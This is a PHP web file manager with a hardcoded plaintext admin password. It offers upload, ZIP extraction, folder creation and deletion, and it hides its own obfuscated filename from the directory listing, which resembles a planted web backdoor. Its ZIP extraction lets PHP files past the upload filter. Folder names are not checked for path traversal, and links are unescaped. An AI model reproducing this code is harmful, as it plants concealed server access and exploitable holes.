<?php
session_start();

// ==========================================
// 1. CONFIGURATION (USERNAME & PASSWORD)
// ==========================================
define('ADMIN_USER', 'King');
define('ADMIN_PASS', 'Sojolkhan9988mm'); // Apnar pochondo moto password change korun

// Base directory is set to current directory (No auto-created uploads folder)
$base_dir = __DIR__;

// Authentication Logic
if (isset($_POST['action_login'])) {
    if ($_POST['username'] === ADMIN_USER && $_POST['password'] === ADMIN_PASS) {
        $_SESSION['loggedin'] = true;
        header("Location: dsjbdgyhdjdjdjudhgdhdhhd.php");
        exit;
    } else {
        $login_error = "Invalid username or password!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: dsjbdgyhdjdjdjudhgdhdhhd.php");
    exit;
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="bn">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login - File Manager</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #0f172a; color: #f8fafc; font-family: sans-serif; min-height: 100vh; display: flex; align-items: center; }
            .login-card { background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; }
            .form-control { background: #0f172a; border: 1px solid rgba(255,255,255,0.1); color: #fff; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-4">
                    <div class="card login-card p-4">
                        <h4 class="text-center fw-bold mb-3">File Manager Login</h4>
                        <?php if (isset($login_error)): ?>
                            <div class="alert alert-danger py-2 small"><?php echo $login_error; ?></div>
                        <?php endif; ?>
                        <form method="POST">
                            <input type="hidden" name="action_login" value="1">
                            <div class="mb-3">
                                <label class="small">Username</label>
                                <input type="text" name="username" class="form-control" required placeholder="admin">
                            </div>
                            <div class="mb-4">
                                <label class="small">Password</label>
                                <input type="password" name="password" class="form-control" required placeholder="••••••">
                            </div>
                            <button type="submit" class="btn btn-primary w-100 fw-semibold">Access Dashboard</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==========================================
// 2. PATH & DIRECTORY HANDLER
// ==========================================
$rel_path = isset($_GET['dir']) ? trim($_GET['dir'], '/\\') : '';
$current_dir = realpath($base_dir . '/' . $rel_path);

if ($current_dir === false || strpos($current_dir, realpath($base_dir)) !== 0) {
    $current_dir = realpath($base_dir);
    $rel_path = '';
}

// AJAX SINGLE FILE UPLOAD ENDPOINT (Supports HTML, PDF, ZIP)
if (isset($_FILES['ajax_file'])) {
    header('Content-Type: application/json');
    $allowed_ext = ['pdf', 'html', 'htm', 'zip'];
    $file_name = $_FILES['ajax_file']['name'];
    $tmp_name = $_FILES['ajax_file']['tmp_name'];
    $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));

    if (in_array($ext, $allowed_ext)) {
        $dest = $current_dir . '/' . basename($file_name);
        if (move_uploaded_file($tmp_name, $dest)) {
            echo json_encode(['status' => 'success', 'file' => $file_name]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Upload failed']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid file extension']);
    }
    exit;
}

$msg = '';
$error = '';

// Create Folder (Supports nested)
if (isset($_POST['action_create_folder'])) {
    $folder_name = trim($_POST['folder_name']);
    if (!empty($folder_name)) {
        $target_path = $current_dir . '/' . $folder_name;
        if (!file_exists($target_path)) {
            if (mkdir($target_path, 0777, true)) {
                $msg = "Folder directory created successfully!";
            } else {
                $error = "Failed to create folder.";
            }
        } else {
            $error = "Folder already exists!";
        }
    }
}

// UNZIP / EXTRACT FEATURE
if (isset($_GET['unzip'])) {
    $zip_filename = basename($_GET['unzip']);
    $zip_file_path = $current_dir . '/' . $zip_filename;

    if (file_exists($zip_file_path) && strtolower(pathinfo($zip_file_path, PATHINFO_EXTENSION)) === 'zip') {
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($zip_file_path) === TRUE) {
                $zip->extractTo($current_dir);
                $zip->close();
                $msg = "ZIP file '{$zip_filename}' extracted successfully!";
            } else {
                $error = "Failed to open or extract ZIP file!";
            }
        } else {
            $error = "PHP ZipArchive extension is not enabled on your server!";
        }
    } else {
        $error = "Invalid ZIP file selection.";
    }
}

// Delete File/Folder
if (isset($_GET['delete'])) {
    $target_to_delete = $current_dir . '/' . basename($_GET['delete']);
    if (file_exists($target_to_delete)) {
        if (is_dir($target_to_delete)) {
            function deleteDir($dir) {
                foreach (scandir($dir) as $item) {
                    if ($item == '.' || $item == '..') continue;
                    if (!deleteDir($dir . '/' . $item)) return false;
                }
                return rmdir($dir);
            }
            if (deleteDir($target_to_delete)) {
                $msg = "Folder deleted successfully!";
            } else {
                $error = "Could not delete folder.";
            }
        } else {
            if (unlink($target_to_delete)) {
                $msg = "File deleted successfully!";
            } else {
                $error = "Could not delete file.";
            }
        }
    }
}

// Read Files and Folders (Hides dsjbdgyhdjdjdjudhgdhdhhd.php itself from listing)
$items = array_diff(scandir($current_dir), array('.', '..', 'dsjbdgyhdjdjdjudhgdhdhhd.php'));
$folders = [];
$files = [];

foreach ($items as $item) {
    if (is_dir($current_dir . '/' . $item)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

$parent_rel_path = false;
if ($current_dir !== realpath($base_dir)) {
    $parent_rel_path = dirname($rel_path);
    if ($parent_rel_path === '.' || $parent_rel_path === '\\') {
        $parent_rel_path = '';
    }
}
?>

<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Dashboard - File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .navbar { background: rgba(30, 41, 59, 0.8); border-bottom: 1px solid rgba(255,255,255,0.08); }
        .card-panel { background: #1e293b; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 14px; }
        .table { color: #e2e8f0; vertical-align: middle; }
        .table-hover tbody tr:hover { background-color: rgba(255, 255, 255, 0.03); }
        .ad-space { background: linear-gradient(135deg, rgba(99, 102, 241, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%); border: 1px dashed rgba(99, 102, 241, 0.4); border-radius: 12px; }
        .btn-custom { background: #6366f1; color: #fff; border: none; }
        .btn-custom:hover { background: #4f46e5; color: #fff; }
        .form-control { background: #0f172a; border: 1px solid rgba(255,255,255,0.1); color: #fff; }
        .form-control:focus { background: #0f172a; color: #fff; border-color: #6366f1; }
        .folder-link { text-decoration: none; color: #38bdf8; font-weight: 500; }
        .folder-link:hover { text-decoration: underline; color: #7dd3fc; }
        .badge-pdf { background-color: #ef4444; }
        .badge-html { background-color: #f97316; }
        .badge-zip { background-color: #a855f7; }
    </style>
</head>
<body>

<nav class="navbar navbar-expand-lg sticky-top mb-4">
    <div class="container-fluid px-4">
        <a class="navbar-brand text-white fw-bold" href="dsjbdgyhdjdjdjudhgdhdhhd.php">
            <i class="fa-solid fa-folder-tree me-2 text-primary"></i> File Engine
        </a>
        <div class="d-flex align-items-center gap-3">
            <a href="?logout=1" class="btn btn-outline-danger btn-sm rounded-pill"><i class="fa-solid fa-right-from-bracket me-1"></i> Logout</a>
        </div>
    </div>
</nav>

<div class="container-fluid px-4">
    
    <!-- ADVERTISEMENT SECTION -->
    <div class="ad-space p-3 text-center mb-4">
        <small class="text-uppercase fw-bold text-muted d-block mb-1" style="font-size: 0.7rem;">Advertisement</small>
        <div class="py-2 text-info">
            <i class="fa-solid fa-rectangle-ad me-2"></i> <strong>Place Your Google AdSense / Banner Code Here</strong>
        </div>
    </div>

    <!-- Alerts -->
    <?php if ($msg): ?>
        <div class="alert alert-success alert-dismissible fade show card-panel text-white border-success mb-4"><?php echo $msg; ?></div>
    <?php endif; ?>

    <?php if ($error): ?>
        <div class="alert alert-danger alert-dismissible fade show card-panel text-white border-danger mb-4"><?php echo $error; ?></div>
    <?php endif; ?>

    <div class="row g-4 mb-4">
        <!-- Folder Creation -->
        <div class="col-md-5">
            <div class="card card-panel p-4 h-100">
                <h6 class="fw-bold mb-3"><i class="fa-solid fa-folder-plus text-warning me-2"></i>Create Folder</h6>
                <form method="POST" class="d-flex gap-2">
                    <input type="hidden" name="action_create_folder" value="1">
                    <input type="text" name="folder_name" class="form-control" placeholder="e.g. new/video" required>
                    <button type="submit" class="btn btn-custom text-nowrap">Create</button>
                </form>
            </div>
        </div>

        <!-- Smart Bulk Upload System (HTML, PDF, ZIP) -->
        <div class="col-md-7">
            <div class="card card-panel p-4 h-100">
                <h6 class="fw-bold mb-3"><i class="fa-solid fa-cloud-arrow-up text-primary me-2"></i>Bulk Upload (HTML, PDF, ZIP)</h6>
                <div class="d-flex gap-2 mb-2">
                    <input type="file" id="bulk_file_input" class="form-control" accept=".pdf,.html,.htm,.zip" multiple>
                    <button type="button" id="start_upload_btn" class="btn btn-success text-nowrap"><i class="fa-solid fa-upload me-1"></i> Upload</button>
                </div>
                
                <!-- Progress Bar -->
                <div class="progress mt-2 d-none" id="upload_progress_container" style="height: 18px; background: #0f172a;">
                    <div id="upload_progress_bar" class="progress-bar progress-bar-striped progress-bar-animated bg-info" style="width: 0%">0%</div>
                </div>
                <small id="upload_status_text" class="text-muted mt-1 d-block"></small>
            </div>
        </div>
    </div>

    <!-- Navigation Bar -->
    <div class="card card-panel p-3 mb-4 d-flex flex-row align-items-center justify-content-between">
        <div class="d-flex align-items-center gap-2">
            <?php if ($parent_rel_path !== false): ?>
                <a href="?dir=<?php echo urlencode($parent_rel_path); ?>" class="btn btn-secondary btn-sm rounded-pill px-3">
                    <i class="fa-solid fa-arrow-left me-1"></i> Back
                </a>
            <?php else: ?>
                <button class="btn btn-secondary btn-sm rounded-pill px-3" disabled><i class="fa-solid fa-arrow-left me-1"></i> Back</button>
            <?php endif; ?>
            <span class="text-muted ms-2">Current Directory:</span>
            <span class="badge bg-dark text-info px-3 py-2">/<?php echo htmlspecialchars($rel_path); ?></span>
        </div>
        <div class="text-muted small">
            Folders: <strong><?php echo count($folders); ?></strong> | Files: <strong><?php echo count($files); ?></strong>
        </div>
    </div>

    <!-- Table -->
    <div class="card card-panel p-3 mb-5">
        <div class="table-responsive">
            <table class="table table-hover mb-0">
                <thead>
                    <tr class="text-muted border-bottom border-secondary">
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th class="text-end">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($folders) && empty($files)): ?>
                        <tr><td colspan="4" class="text-center py-5 text-muted">This directory is empty.</td></tr>
                    <?php endif; ?>

                    <!-- Folders List -->
                    <?php foreach ($folders as $folder): ?>
                        <?php $next_dir = ltrim($rel_path . '/' . $folder, '/'); ?>
                        <tr>
                            <td>
                                <i class="fa-solid fa-folder text-warning me-2"></i>
                                <a href="?dir=<?php echo urlencode($next_dir); ?>" class="folder-link"><?php echo htmlspecialchars($folder); ?></a>
                            </td>
                            <td><span class="badge bg-warning-subtle text-warning border border-warning-subtle">Directory</span></td>
                            <td>—</td>
                            <td class="text-end">
                                <a href="?dir=<?php echo urlencode($rel_path); ?>&delete=<?php echo urlencode($folder); ?>" class="btn btn-outline-danger btn-sm border-0" onclick="return confirm('Delete folder?')">
                                    <i class="fa-solid fa-trash-can"></i> Delete
                                </a>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <!-- Files List -->
                    <?php foreach ($files as $file): ?>
                        <?php 
                            $file_path = $current_dir . '/' . $file;
                            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                            $file_size = round(filesize($file_path) / 1024, 2) . ' KB';
                            $file_url = ($rel_path ? $rel_path . '/' : '') . $file;
                        ?>
                        <tr>
                            <td>
                                <?php if ($ext === 'pdf'): ?>
                                    <i class="fa-solid fa-file-pdf text-danger me-2"></i>
                                <?php elseif ($ext === 'zip'): ?>
                                    <i class="fa-solid fa-file-zipper text-purple me-2" style="color: #a855f7;"></i>
                                <?php else: ?>
                                    <i class="fa-solid fa-file-code text-warning me-2"></i>
                                <?php endif; ?>
                                <a href="<?php echo $file_url; ?>" target="_blank" class="text-light text-decoration-none"><?php echo htmlspecialchars($file); ?></a>
                            </td>
                            <td>
                                <?php if ($ext === 'pdf'): ?>
                                    <span class="badge badge-pdf">PDF</span>
                                <?php elseif ($ext === 'zip'): ?>
                                    <span class="badge badge-zip">ZIP Archive</span>
                                <?php else: ?>
                                    <span class="badge badge-html"><?php echo strtoupper($ext); ?></span>
                                <?php endif; ?>
                            </td>
                            <td class="small text-muted"><?php echo $file_size; ?></td>
                            <td class="text-end">
                                <?php if ($ext === 'zip'): ?>
                                    <a href="?dir=<?php echo urlencode($rel_path); ?>&unzip=<?php echo urlencode($file); ?>" 
                                       class="btn btn-outline-warning btn-sm border-0 me-1" 
                                       onclick="return confirm('Extract this ZIP file in current folder?')">
                                        <i class="fa-solid fa-box-open me-1"></i> Unzip
                                    </a>
                                <?php else: ?>
                                    <a href="<?php echo $file_url; ?>" target="_blank" class="btn btn-outline-info btn-sm border-0 me-1">
                                        <i class="fa-solid fa-eye"></i> View
                                    </a>
                                <?php endif; ?>

                                <a href="?dir=<?php echo urlencode($rel_path); ?>&delete=<?php echo urlencode($file); ?>" class="btn btn-outline-danger btn-sm border-0" onclick="return confirm('Delete file?')">
                                    <i class="fa-solid fa-trash-can"></i> Delete
                                </a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- AJAX Bulk Upload Script -->
<script>
document.getElementById('start_upload_btn').addEventListener('click', async function () {
    const fileInput = document.getElementById('bulk_file_input');
    const files = fileInput.files;

    if (files.length === 0) {
        alert("Please select files first!");
        return;
    }

    const progressContainer = document.getElementById('upload_progress_container');
    const progressBar = document.getElementById('upload_progress_bar');
    const statusText = document.getElementById('upload_status_text');

    progressContainer.classList.remove('d-none');
    this.disabled = true;

    let successCount = 0;
    const currentDir = "<?php echo urlencode($rel_path); ?>";

    for (let i = 0; i < files.length; i++) {
        const formData = new FormData();
        formData.append('ajax_file', files[i]);

        try {
            const response = await fetch(`dsjbdgyhdjdjdjudhgdhdhhd.php?dir=${currentDir}`, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (result.status === 'success') {
                successCount++;
            }
        } catch (error) {
            console.error('Error uploading file:', files[i].name);
        }

        const percent = Math.round(((i + 1) / files.length) * 100);
        progressBar.style.width = percent + '%';
        progressBar.innerText = percent + '%';
        statusText.innerText = `Uploaded ${i + 1} of ${files.length} files...`;
    }

    statusText.innerText = `Upload Completed! ${successCount} files uploaded successfully. Reloading...`;
    setTimeout(() => {
        window.location.reload();
    }, 1500);
});
</script>

</body>
</html>
